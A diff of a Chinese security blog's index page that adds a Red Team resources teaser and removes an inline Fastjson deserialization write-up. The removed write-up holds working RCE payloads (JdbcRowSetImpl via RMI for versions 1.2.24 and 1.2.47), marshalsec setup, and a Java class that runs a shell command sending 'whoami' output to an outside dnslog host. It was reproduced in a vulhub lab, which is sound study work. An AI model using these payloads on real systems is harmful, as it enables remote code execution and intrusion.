@@ -255,6 +255,161 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/13/资料汇总.html/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="狗蛋菌">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Goudan's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/03/13/资料汇总.html/" itemprop="url">资料汇总</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-13T15:49:14+08:00">
+                2021-03-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  25.9k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  112 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a><strong>项目简介</strong></h2><p><strong><em>\</em>一个 Red Team 攻击的生命周期，整个生命周期包括：信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、在所有攻击结束之后清理并退出战场。**</strong></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/03/13/资料汇总.html/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/12/Fastjson漏洞复现和研究.html/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -356,75 +511,15 @@
 
       
         
-          
-            <h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p>
+          <h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p>
 <p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p>
-<p>由于普通序列化的时候各个类的私有属性无法区别，比如：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bicycle</span> <span class="keyword">implements</span> <span class="title">vehicle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal wheels;</span><br><span class="line">    <span class="comment">//省略 setter/getter、toString等</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">car</span> <span class="keyword">implements</span> <span class="title">vehicle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal wheels;</span><br><span class="line">    <span class="comment">//省略 setter/getter、toString等</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化之后：</span></span><br><span class="line">toJSONString : &#123;<span class="string">"vehicle"</span>:&#123;<span class="string">"wheels"</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">toJSONString : &#123;<span class="string">"vehicle"</span>:&#123;<span class="string">"wheels"</span>:<span class="number">4</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>所以Fastjson自定义了序列化的方法，引入了 Autotype，在序列化的时候将原始数据类型记录下来</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"vehicle"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.hollis.lab.fastjson.test.bicycle"</span>,</span><br><span class="line">        <span class="attr">"wheels"</span>:<span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"vehicle"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.hollis.lab.fastjson.test.car"</span>,</span><br><span class="line">        <span class="attr">"wheels"</span>:<span class="number">4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样我们可以利用 @type 的值任意引用 java 的类，从而造成 RCE 漏洞</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-2-24："><a href="#1-2-24：" class="headerlink" title="1.2.24："></a>1.2.24：</h2><p>payload:</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://&lt; rmi服务器的IP &gt;:9999/ &lt;Exploit&gt;"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="搭建实验环境："><a href="#搭建实验环境：" class="headerlink" title="搭建实验环境："></a>搭建实验环境：</h3><h4 id="kali-2020"><a href="#kali-2020" class="headerlink" title="kali 2020 :"></a>kali 2020 :</h4><p> IP：192.168.239.134</p>
-<h4 id="搭建vulhub靶场："><a href="#搭建vulhub靶场：" class="headerlink" title="搭建vulhub靶场："></a>搭建vulhub靶场：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub</span><br><span class="line"><span class="built_in">cd</span> fastjson</span><br><span class="line"><span class="built_in">cd</span> 1.2.24-rce</span><br><span class="line">docker-compose up -d </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span>  1.2.47-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<h4 id="java版本："><a href="#java版本：" class="headerlink" title="java版本："></a>java版本：</h4><p>1.8.0_281</p>
-<p><img src="https://i.loli.net/2021/03/12/YRFTLlD86e9tirU.png" alt="image-20210312232000792"></p>
-<p>版本不一致的话可以下载该版本，然后切换java版本</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives  --install  /usr/bin/java  java  /opt/java/jdk1.8.0_281/bin/java  4</span><br><span class="line">update-alternatives  --config  java</span><br></pre></td></tr></table></figure>
-
-<h4 id="安装maven："><a href="#安装maven：" class="headerlink" title="安装maven："></a>安装maven：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.bfsu.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">mkdir /opt/maven</span><br><span class="line">tar zxvf apache-maven-3.6.3-bin.tar.gz -C /opt/maven/</span><br><span class="line">vim /etc/profile  <span class="comment">#配置环境变量</span></span><br><span class="line"><span class="comment">#在最下面增加</span></span><br><span class="line"><span class="built_in">export</span> MAVEN_HOME=/opt/maven/apache-maven-3.6.3</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$MAVEN_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="comment">#验证maven是否安装成功</span></span><br><span class="line">mvn -version</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/03/12/4fJiXKI72cEWskh.png" alt="image-20210312232218117"></p>
-<h4 id="安装java反序列化利用工具："><a href="#安装java反序列化利用工具：" class="headerlink" title="安装java反序列化利用工具："></a>安装java反序列化利用工具：</h4><p>marshalsec</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mbechler/marshalsec.git</span><br><span class="line"><span class="built_in">cd</span> marshalsec/</span><br><span class="line">mvn clean package –DskipTests  <span class="comment">#编译项目</span></span><br></pre></td></tr></table></figure>
-
-<p>启动rmi服务器</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> target/</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">"http://192.168.239.134:9998/#dnslog"</span> 9999</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/03/12/tbXq2MNx6DVvszP.png" alt="image-20210312232658834"></p>
-<h4 id="安装靶场服务器："><a href="#安装靶场服务器：" class="headerlink" title="安装靶场服务器："></a>安装靶场服务器：</h4><p>用 java 编译如下文件</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">dnslog</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"ping user.`whoami`.&lt;dnslog服务器地址&gt;"</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译成功后将 class 文件放到 kali 中，并在同一目录下启动靶场服务器</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 9998</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/03/12/z2lM5wZ7c69Xfgb.png" alt="image-20210312233722511"></p>
-<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol>
-<li><p>启动 fastjson 服务器</p>
-<p><img src="https://i.loli.net/2021/03/12/QbqP4LySKkMg8u9.png" alt="image-20210312234140445"></p>
-</li>
-<li><p>启动 rmi 服务器，记录下dnslog地址</p>
-<p><img src="https://i.loli.net/2021/03/12/iJ5X6u9w2TQZl8F.png" alt="image-20210312234207407"></p>
-<p><img src="https://i.loli.net/2021/03/12/3G2spUNDrJKyi5h.png" alt="image-20210312234235446"></p>
-</li>
-<li><p>更改java文件中的dnslog服务器地址，并编译该Java文件</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] commands = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"ping user.`whoami`.uvv1ep.dnslog.cn"</span>&#125;;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>将class文件放入kali中，启动靶场服务器</p>
-<p><img src="https://i.loli.net/2021/03/12/z2lM5wZ7c69Xfgb.png" alt="image-20210312233722511"></p>
-</li>
-<li><p>访问 fastjson，将数据包改为 POST 请求，并在数据部分添加 payload</p>
-<p><img src="https://i.loli.net/2021/03/12/slTjDfxywF21aiB.png" alt="image-20210312234426060"></p>
-</li>
-<li><p>刷新 dnslog 可看到有一条请求，则成功 rce</p>
-<p><img src="https://i.loli.net/2021/03/12/gjubXL4h6p2erUR.png" alt="image-20210312234445371"></p>
-</li>
-</ol>
-<h2 id="1-2-47："><a href="#1-2-47：" class="headerlink" title="1.2.47："></a>1.2.47：</h2><p>该版本中将AutoType关闭了，但是该版本会首先从全局缓存中获取类</p>
-<p>全局缓存中java.lang.Class类对应的deserializer为MiscCodec，反序列化时会取json串中的val值并加载这个val对应的类。</p>
-<p>如果fastjson cache为true，就会缓存这个val对应的class到全局缓存中</p>
-<p>所以只需将1.2.24中的payload更换为</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://192.168.239.134:9999/dnslog"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/03/13/HhF14aPkXBVNI8p.png" alt="image-20210313001102697"></p>
-<p><img src="https://i.loli.net/2021/03/13/dgFrIOXvRq79EU1.png" alt="image-20210313001027020"></p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/03/12/Fastjson漏洞复现和研究.html/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2439,161 +2534,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/01/19/-CISCN2019-华北赛区-Day1-Web1-Dropbox.html/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="狗蛋菌">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Goudan's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/01/19/-CISCN2019-华北赛区-Day1-Web1-Dropbox.html/" itemprop="url">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-01-19T10:46:12+08:00">
-                2021-01-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  467 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>考点：phar协议</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2021/01/19/-CISCN2019-华北赛区-Day1-Web1-Dropbox.html/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2644,7 +2584,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">22</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2657,7 +2597,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
